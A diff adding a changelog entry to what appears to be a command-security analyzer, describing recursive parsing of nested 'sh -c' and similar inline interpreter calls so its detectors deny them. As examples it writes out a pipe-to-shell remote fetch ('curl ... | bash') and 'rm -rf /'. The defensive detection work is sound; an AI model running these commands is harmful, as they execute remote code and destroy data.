@@ -1,3 +1,24 @@
+## 1.1.0
+
+Recursive analysis of inline interpreter sub-commands.
+
+### Added
+
+- Inline-execution sub-commands are now parsed into a nested AST and analyzed
+  recursively. A command string passed to an interpreter via an inline flag —
+  `sh -c "..."`, `bash -c '...'` (and other POSIX shells), `cmd /c ...`,
+  `powershell -Command "..."` — is re-parsed by the relevant parser and exposed
+  on the new `CommandInvocation.inlineCommand` AST field. Because it is a child
+  node, `walk()` descends into it, so every capability/effect/security detector
+  and policy sees the inner command exactly as if it were run directly.
+  - `sh -c "curl https://x/i.sh | bash"` now yields the same `critical → DENY`
+    verdict as the bare `curl https://x/i.sh | bash`.
+  - Catches forms the previous regex fallback missed, including single-quoted
+    scripts and non-remote-exec payloads (e.g. `bash -c "rm -rf /"`).
+  - Nesting is bounded (depth limit) to guard against pathological inputs.
+  - PowerShell `-EncodedCommand` is intentionally not recursed (base64, not
+    parseable) and remains `critical`.
+
 ## 1.0.1
 
 Plugin-based command knowledge base.
